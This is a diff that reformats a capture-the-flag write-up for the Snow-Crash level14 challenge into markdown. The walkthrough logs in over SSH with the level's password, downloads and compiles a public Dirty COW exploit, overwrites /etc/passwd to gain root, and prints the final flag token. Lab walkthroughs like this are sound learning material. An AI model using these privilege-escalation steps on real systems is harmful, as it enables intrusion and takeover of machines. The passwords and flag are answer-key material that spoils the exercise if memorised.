@@ -1,13 +1,18 @@
-# Login as level14.
+Login as `level14`.
+```shell
 ┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level14
 level14@192.168.1.64's password: 2A31L79asukciNyi8uppkEuSx
-# There is no file or binary to exploit in home directory.
-# Search for what can be exploit.
+```
+There is no file or binary to exploit in home directory. Search for what can be exploit.
+```shell
 level14@SnowCrash:~$ uname -a
 Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
-# Linux kernel < 4.8.3 (created before 2018) are vulnerable to Dirty COW.
-# Dirty COW allows privilege escalation by exploiting race condition on the copy-on-write mechanism.
+```
+Linux kernel `< 4.8.3` (created before 2018) are vulnerable to **Dirty COW**[¹](https://dirtycow.ninja/).
+
+Dirty COW allows privilege escalation by exploiting race condition on the copy-on-write mechanism.
+```shell
 level14@SnowCrash:~$ cd /tmp/
 level14@SnowCrash:/tmp$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
 level14@SnowCrash:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
@@ -31,11 +36,16 @@ You can log in with the username 'firefart' and the password ''.
 
 
 DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
-# Login as root.
+```
+Login as `root`.
+```shell
 level14@SnowCrash:/tmp$ su firefart
 Password: <Enter>
-# Login as flag14 and get the flag.
+```
+Login as `flag14` and get the flag.
+```shell
 firefart@SnowCrash:/tmp# su flag14
 Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
 flag14@SnowCrash:~$ getflag
 Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+```
